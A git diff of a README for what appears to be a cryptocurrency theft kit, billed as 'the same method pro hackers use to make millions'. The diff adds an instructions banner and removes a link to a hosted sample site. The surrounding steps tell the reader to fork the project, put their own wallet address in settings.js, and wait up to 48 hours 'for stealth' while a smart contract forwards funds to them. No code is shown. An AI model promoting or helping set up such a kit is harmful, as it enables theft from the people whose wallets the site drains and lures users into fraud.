@@ -4,6 +4,13 @@ This is the same method pro hackers use to make millions
 
 
 
+######################################################################################
+
+                                 Instructions on how to start are below ⬇️ ⬇️ ⬇️
+######################################################################################
+
+
+
 Make sure you fork this project before doing the tutorial here is how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 youtube tutorial on how to use this after forking https://youtu.be/ESxOvW-IOg0
@@ -85,7 +92,6 @@ TESTING (OPTIONAL)
 
 3. wait for smart contract to foward it to you it make take 2-48 hours for stealth
 
-Sample site https://thunderous-nasturtium-acb743.netlify.app/
 
 To use all you have to do is put your wallet address in the settings.js file.
 
